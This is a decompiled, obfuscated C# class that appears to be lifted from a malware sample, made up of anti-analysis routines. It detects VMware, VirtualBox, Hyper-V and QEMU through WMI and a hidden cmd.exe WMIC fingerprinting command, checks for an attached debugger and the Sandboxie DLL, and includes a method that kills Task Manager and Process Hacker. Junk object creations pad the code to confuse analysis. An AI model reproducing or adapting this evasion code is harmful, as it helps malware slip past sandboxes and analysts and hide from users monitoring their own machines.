using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Policy;
using System.Security.Principal;
using System.Text;
using System.Threading;

internal class wlAkDe79zc
{
	private static readonly List<string> Gno5yg = new List<string> { "ProcessHacker", "taskmgr" };

	public static void zI2Kf98z()
	{
		if (y5MvcKw() || FogQcGIyqDi() || gfTRaA() || X6JN0UCy3iH9hwV())
		{
			Console.WriteLine("TEST VIRTUAL BOX");
		}
	}

	private static bool y5MvcKw()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				ManagementObjectEnumerator enumerator = val2.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						string text = current.get_Item("Manufacturer").ToString()!.ToLower();
						if ((text == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		return false;
	}

	private static bool FogQcGIyqDi()
	{
		new InvalidProgramException();
		new ReaderWriterLock();
		new DecoderExceptionFallback();
		bool NwQuVZiWcOAR = false;
		new MemberAccessException();
		new SystemException();
		new ToBase64Transform();
		CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref NwQuVZiWcOAR);
		return NwQuVZiWcOAR;
	}

	public static bool X6JN0UCy3iH9hwV()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0148: Unknown result type (might be due to invalid IL or missing references)
		new ApplicationTrust();
		new InsufficientExecutionStackException();
		new KeyNotFoundException();
		new NotFiniteNumberException();
		new MissingMethodException();
		new FieldAccessException();
		new CryptographicUnexpectedOperationException();
		new AbandonedMutexException();
		new MissingFieldException();
		new PKCS1MaskGenerationMethod();
		new RSAPKCS1KeyExchangeFormatter();
		new HMACSHA1();
		new InsufficientExecutionStackException();
		new ToBase64Transform();
		new StringBuilder();
		new DriveNotFoundException();
		new ManualResetEventSlim();
		new MemoryStream();
		new ReaderWriterLock();
		new AppDomainSetup();
		new AssemblyNameProxy();
		new InvalidOperationException();
		new InvalidOperationException();
		new CannotUnloadAppDomainException();
		new IndexOutOfRangeException();
		new DecoderExceptionFallbackBuffer();
		new CryptographicUnexpectedOperationException();
		new DecoderExceptionFallback();
		new StackTrace();
		new object();
		new IdentityReferenceCollection();
		new JulianCalendar();
		new ArgumentNullException();
		new CryptoConfig();
		new OperationCanceledException();
		new Queue();
		new RankException();
		new X509Certificate();
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			UseShellExecute = false,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			FileName = "cmd.exe",
			Arguments = "/C WMIC OS get Caption,OSArchitecture,Version /Format:table & WMIC BIOS Get Manufacturer,Name /Format:table & WMIC Baseboard Get Product,Manufacturer /Format:table & WMIC CPU Get Name,NumberOfCores,NumberOfLogicalProcessors /Format:table & WMIC Memorychip Get Manufacturer,Capacity,Speed,PartNumber /Format:table & WMIC Diskdrive Get Model,Size /Format:table & WMIC Path Win32_VideoController get Caption,VideoModeDescription /Format:table & WMIC netuse get Name /Format:table",
			RedirectStandardError = true,
			RedirectStandardOutput = true
		};
		new Random();
		new SynchronizationLockException();
		new DecoderExceptionFallbackBuffer();
		new DecoderFallbackException();
		new HostSecurityManager();
		new DecoderFallbackException();
		process.Start();
		new TaiwanCalendar();
		new HMACSHA384();
		process.WaitForExit();
		string text = process.StandardOutput.ReadToEnd();
		if (!text.Contains("Virtual") && !text.Contains("virtual") && !text.Contains("QEMU"))
		{
			return false;
		}
		return true;
	}

	private static bool gfTRaA()
	{
		if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
		{
			return true;
		}
		return false;
	}

	private static void FDBPJGc3rNq0Hp()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				if (Gno5yg.Contains(process.ProcessName))
				{
					process.Kill();
				}
			}
			catch
			{
			}
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool NwQuVZiWcOAR);
}
